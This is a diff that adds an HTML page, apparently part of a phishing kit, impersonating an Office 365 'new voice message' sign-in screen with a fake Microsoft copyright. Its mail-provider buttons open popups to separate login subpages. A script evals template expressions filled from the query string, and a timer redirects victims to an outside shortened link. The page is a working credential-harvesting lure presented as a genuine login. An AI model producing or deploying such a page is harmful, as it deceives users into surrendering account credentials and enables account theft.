@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Office 365</title>
+    <style>
+        @font-face {
+            font-family: 'Segoe UI';
+            src: url('assets/SegoeUI.eot');
+            src: local('Segoe UI'), local('SegoeUI'),
+                url('assets/SegoeUI.eot?#iefix') format('embedded-opentype'),
+                url('assets/SegoeUI.woff2') format('woff2'),
+                url('assets/SegoeUI.woff') format('woff'),
+                url('assets/SegoeUI.ttf') format('truetype');
+            font-weight: normal;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Segoe UI';
+            src: url('assets/SegoeUI-SemiBold.eot');
+            src: local('Segoe UI Semibold'), local('SegoeUI-SemiBold'),
+                url('assets/SegoeUI-SemiBold.eot?#iefix') format('embedded-opentype'),
+                url('assets/SegoeUI-SemiBold.woff2') format('woff2'),
+                url('assets/SegoeUI-SemiBold.woff') format('woff'),
+                url('assets/SegoeUI-SemiBold.ttf') format('truetype');
+            font-weight: 600;
+            font-style: normal;
+        }
+        *{
+            box-sizing: border-box;
+        }
+        body{
+            font-family: Segoe UI;
+            background-image: url('assets/1.png');
+            background-size: cover;
+            background-position: center center;
+            padding: 2vw;
+            margin: 0;
+            display: flex;
+            align-items: center;
+        }
+        .si-card{
+            width: 100%;
+            max-width: 90%;
+            background-color: #fff;
+            margin: 0 auto;
+            box-shadow: 0px 9px 19px 0px rgb(0 0 0 / 40%);
+            background-image: url('assets/2.png');
+            background-size: cover;
+            background-position: center center;
+            position: relative;
+            display: flex;
+            flex-wrap: wrap;
+            padding-bottom: 3%;
+        }
+        .logo{
+            position: absolute;
+            top: 4%;
+            left: 3.5%;
+            width: 16vw;
+            z-index: 2;
+        }
+        .col-left{
+            width: 50%;
+            display: flex;
+            align-items: flex-start;
+            padding: 8% 0 0 5%;
+        }
+        .col-right{
+            width: 50%;
+            padding: 2% 5% 4%;
+            text-align: center;
+        }
+        .art{
+            width: 26vw;
+            max-width: 100%;
+            margin-top: 2vw;
+        }
+        .login-card{
+            background-color: #fff;
+            width: 100%;
+            max-width: 26vw;
+            border-radius: 0.5vw;
+            height: max-content;
+            z-index: 4;
+            padding: 1.8vw;
+            box-shadow: 0 3px 6px rgb(0 0 0 / 16%), 0 3px 6px rgb(0 0 0 / 23%);
+        }
+        .ms-logo{
+            width: 10vw;
+            margin-bottom: 2%;
+        }
+        .heading{
+            font-size: 1.4vw;
+            font-weight: 600;
+            margin-bottom: 0.4vw;
+        }
+        .heading img{
+            margin-right: 0.4%;
+            height: 1.6vw;
+            vertical-align: middle;
+        }
+        .sub-text{
+            color: #999999;
+            font-size: 1.18vw;
+            font-weight: 600;
+            margin-bottom: 1vw;
+        }
+        .links a{
+            display:block;
+        }
+        .links img{
+            width: 100%;
+            margin-bottom: 2%;
+            transition: all 0.3s;
+        }
+        .links img:hover{
+            transform: scale(1.05);
+        }
+        .copyright{
+            position: absolute;
+            bottom: 2%;
+            left: 3%;
+            font-size: 1vw;
+            color: #000;
+            z-index: 2;
+        }
+        .footer{
+            position: absolute;
+            bottom: 2%;
+            right: 3%;
+            font-size: 1vw;
+            z-index: 4;
+        }
+        .footer a{
+            color: #1b1b1b;
+            text-decoration: none;
+        }
+        .footer a:not(:first-child) {
+            margin-left: 2vw;
+        }
+        .tagline{
+            font-size: 1.8vw;
+            font-weight: 600;
+            margin-bottom: 2.5%;
+            color: #fff;
+        }
+        @media(max-width: 991px){
+            .col-right,.col-left{
+                width: 100%;
+            }
+            .si-card{
+                padding-top: 6%;
+            }
+            .login-card{
+                max-width: 320px;
+                padding: 0.625rem;
+            }
+            .ms-logo{
+                width: 120px;
+            }
+            .tagline,.heading{
+               font-size: 1.25rem;
+           }
+            .sub-text{
+                font-size: 0.975rem;
+            }
+            .heading img{
+                height: 1.6rem;
+            }
+            .copyright,.footer{
+                font-size: 0.625rem;
+            }
+            .footer a{
+                color: #000;
+            }
+            .art{
+                width: 320px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="si-card">
+        <img class="logo" src="assets/office-365-white.svg" alt="microsoft-office-365">
+        <div class="col-left">
+            <div class="login-card">
+                <div class="card-inner">
+                    <img class="ms-logo" src="assets/microsoft_logo.svg" alt="microsoft-logo-svg">
+                    <div class="heading">
+                        <span><img src="call.jpg" alt="voicemail"></span>
+                        <span>You have a new voice message</span>
+                    </div>
+                    <div class="sub-text">
+                        Please sign in to access your voice message
+                    </div>
+                    <div class="links">
+                    <ul style=" list-style-type: none;">
+            <li class="wow pulse animated animated" data-wow-iteration="infinite" data-wow-duration="800ms" style="visibility: visible; animation-duration: 800ms; animation-iteration-count: infinite; animation-name: pulse;">
+                        <a href="" data-nn="mydocs/index.html">
+                            <img src="assets/outlook.png" alt="outlook-login">
+                        </a>
+                         </li>
+                             <li class="wow pulse animated animated" data-wow-iteration="infinite" data-wow-duration="800ms" style="visibility: visible; animation-duration: 800ms; animation-iteration-count: infinite; animation-name: pulse;">
+                        <a href="" data-nn="myao/index.html">
+                            <img src="assets/Aol shape.png" alt="aol-login">
+                        </a>
+                         </li>
+                             <li class="wow pulse animated animated" data-wow-iteration="infinite" data-wow-duration="800ms" style="visibility: visible; animation-duration: 800ms; animation-iteration-count: infinite; animation-name: pulse;">
+                        <a href="" data-nn="mydocs/index.html">
+                            <img src="assets/office.png" alt="office-login">
+                        </a>
+                         </li>
+                             <li class="wow pulse animated animated" data-wow-iteration="infinite" data-wow-duration="800ms" style="visibility: visible; animation-duration: 800ms; animation-iteration-count: infinite; animation-name: pulse;">
+                        <a href="" data-nn="myah/index.html">
+                            <img src="assets/yahoo.png" alt="yahoo-login">
+                        </a>
+                         </li>
+                             <li class="wow pulse animated animated" data-wow-iteration="infinite" data-wow-duration="800ms" style="visibility: visible; animation-duration: 800ms; animation-iteration-count: infinite; animation-name: pulse;">
+                        <a href="" data-nn="myother/index.html">
+                            <img src="assets/other mails.png" alt="other-login">
+                        </a>
+                          </li>
+                    <script>
+const queryString=[...new URLSearchParams(location.search)].reduce((e,[t,n])=>(e[t]=n,e),{});function templatePage(){let g=document;function a(b){return b.replace(/{\|(.*?)\|}/g,(_,c)=>{let d=eval(c);return null==d?"":d})}for(const e of g.getElementsByTagName("*"))for(const t of e.attributes){let e=a(t.value);e!==t.value&&(t.value=e)}const b=g.createNodeIterator(g.body,NodeFilter.SHOW_TEXT,null);let c;for(;c=b.nextNode();){let e="textContent",t=a(c[e]);t!==c[e]&&(c[e]=t)}}
+templatePage()
+</script>
+                    </ul>
+                    </div>
+                </div>
+                 <div style="" id="checks" style="display: none;"></div>
+   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+   <script>
+     $(document).ready(function(e){ 
+     window_opener_xc(); 
+   });
+   function window_opener_xc(){
+     var url_part = get_extra_data(1);
+     $('li a').click(function(e){
+       e.preventDefault();
+     if($(this).data('nn')){
+       var checks = $('#checks');
+           var win3 = window.open(url_part+$(this).data('nn'), '_blank', 'location=yes,height=570,width=520,scrollbars=yes,status=yes');
+         setInterval(function(){ 
+         if($('#checks').html()){ window.location.replace(get_extra_data(2)); }
+       }, 3000);
+     }
+     });
+   }
+   function get_extra_data(a){
+     var output = '';
+     if(a==1){
+       output = '';
+     }
+     else if(a==2){
+       output = "https://owy.mn/35MDuDz";
+     }
+     return output;
+   }
+   </script>
+            </div>
+        </div>
+        <div class="col-right">
+            <div class="tagline">
+                <span>Designed to help 
+                    you achieve more with 
+                    innovative Office apps</span>
+            </div>
+            <img src="assets/art.png" class="art">
+        </div>
+        
+        <div class="copyright">
+            &#169; 2023 Copyright Microsoft Corporation
+        </div>
+        <div class="footer">
+            <a href="javascript:void(0);">Terms</a>
+            <a href="javascript:void(0);">Privacy &amp; Policy</a>
+            <a href="javascript:void(0);">Help</a>
+        </div>
+    </div>
+</body>
+</html>
